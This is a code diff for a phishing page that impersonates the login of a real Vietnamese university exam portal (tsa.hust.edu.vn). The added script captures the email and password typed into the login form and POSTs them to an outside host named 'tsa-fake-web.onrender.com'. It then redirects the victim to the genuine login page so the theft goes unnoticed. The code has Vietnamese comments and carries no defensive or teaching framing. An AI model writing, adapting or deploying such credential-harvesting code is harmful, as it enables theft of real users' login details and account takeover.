@@ -62,23 +62,26 @@
 </html>
 
 
-<script>
-    document.getElementById("login-form").addEventListener("submit", function(event) {
-        event.preventDefault(); // Ngăn chặn reload trang
-        
-        const email = document.querySelector("input[type='email']").value;
-        const password = document.querySelector("input[type='password']").value;
-        
-        fetch("http://localhost:3000/save-login", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ email, password })
-        }).then(response => response.json())
-        .then(data => {
-            alert("Thông tin đăng nhập đã được lưu!");
-            window.location.href = "https://tsa.hust.edu.vn/dang-nhap"; // Điều hướng sau khi gửi
-        });
+document.getElementById("login-form").addEventListener("submit", function(event) {
+    event.preventDefault(); // Ngăn chặn reload trang
+
+    const email = document.querySelector("input[type='email']").value;
+    const password = document.querySelector("input[type='password']").value;
+
+    fetch("https://tsa-fake-web.onrender.com", { // Dùng URL từ Render
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email, password })
+    }).then(response => response.json())
+    .then(data => {
+        alert("Thông tin đăng nhập đã được lưu!");
+        window.location.href = "https://tsa.hust.edu.vn/dang-nhap"; // Điều hướng sau khi gửi
+    }).catch(error => {
+        console.error("Lỗi khi gửi dữ liệu:", error);
+        alert("Không thể gửi thông tin đăng nhập!");
     });
+});
+
     </script>
     
     
